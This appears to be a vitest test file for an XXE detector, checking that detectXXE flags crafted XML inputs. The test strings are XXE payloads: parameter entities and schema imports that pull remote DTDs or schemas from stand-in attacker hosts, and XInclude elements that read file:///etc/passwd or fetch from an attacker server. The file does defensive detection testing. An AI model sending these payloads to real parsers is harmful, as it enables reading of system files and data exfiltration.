import { describe, it, expect } from 'vitest'
import { detectXXE } from './xxe-evaluator.js'

describe('xxe-evaluator advanced bypass detection', () => {
    it('detects parameter entity declaration with external SYSTEM', () => {
        const detections = detectXXE('<!DOCTYPE root [<!ENTITY % file SYSTEM "http://attacker/p.dtd">%file;]><root/>')
        expect(detections.length).toBeGreaterThan(0)
    })

    it('detects PUBLIC parameter entity usage in DOCTYPE', () => {
        const detections = detectXXE('<!DOCTYPE a [<!ENTITY % xxe PUBLIC "id" "http://evil/x.dtd">%xxe;]><a/>')
        expect(detections.length).toBeGreaterThan(0)
    })

    it('detects external schemaLocation with xsi namespace', () => {
        const detections = detectXXE('<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:x http://attacker/schema.xsd"></root>')
        expect(detections.length).toBeGreaterThan(0)
    })

    it('detects xs:import with remote schemaLocation', () => {
        const detections = detectXXE('<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:import schemaLocation="http://attacker/payload.xsd"/></xs:schema>')
        expect(detections.length).toBeGreaterThan(0)
    })

    it('detects XInclude with file:// path', () => {
        const detections = detectXXE('<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>')
        expect(detections.length).toBeGreaterThan(0)
    })

    it('detects XInclude with http:// to attacker server', () => {
        const detections = detectXXE('<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://attacker/payload.xml"/></root>')
        expect(detections.length).toBeGreaterThan(0)
    })
})
